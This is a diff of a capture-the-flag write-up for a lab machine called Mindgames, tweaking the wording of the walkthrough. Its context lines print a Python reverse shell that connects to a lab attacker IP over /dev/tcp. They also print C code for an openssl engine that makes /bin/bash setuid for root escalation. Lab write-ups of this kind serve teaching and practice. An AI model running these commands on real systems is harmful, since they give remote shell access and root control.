@@ -49,7 +49,7 @@ Found 2 open ports. Accessed the site hosted on port 80 to find obfuscated text 
 Decrypted the examples given on site using <a href="https://www.dcode.fr/brainfuck-language">Dcode.fr</a>
 ![placeholder](/writeup/assets/img/mindgames/print.png "helloworld")
 
-The Brainfuck code translated into the python3 commands.
+The Brainfuck code translated into the python3 commands and those commands were executed.
 
 Created a payload of python reverse shell in Brainfuck language by using this <a href="https://copy.sh/brainfuck/text.html">Website</a>
 ```python3
@@ -61,12 +61,12 @@ os.system('bash -c "bash -i >& /dev/tcp/10.9.12.192/8888 0>&1"')
 
 Executed the payload through the website homepage to get a reverse shell.
 
-Found the user.txt
+Got the user shell and found the user.txt
 
 Ran Linpeas on the machine and found some interesting capabilities.
 ![placeholder](/writeup/assets/img/mindgames/cap.png "capabilities")
  
- So the openssl binary was given permission to *setuid*
+ So the openssl binary was given interesting permission *setuid*
  
  Went to GTFObins and found that openssl command can be used to load specific shared libraries to execute commands.
 ![placeholder](/writeup/assets/img/mindgames/so.png "sharedlibrary")
@@ -98,7 +98,7 @@ static int bind(ENGINE *e, const char *id)
   }
   setuid(0);
   setgid(0);
-  system("chmod u+s /bin/bash");
+  system("chmod u+s /bin/bash");      #Makes /bin/bash SUID binary
   system("echo done");
   ret = 1;
  end:
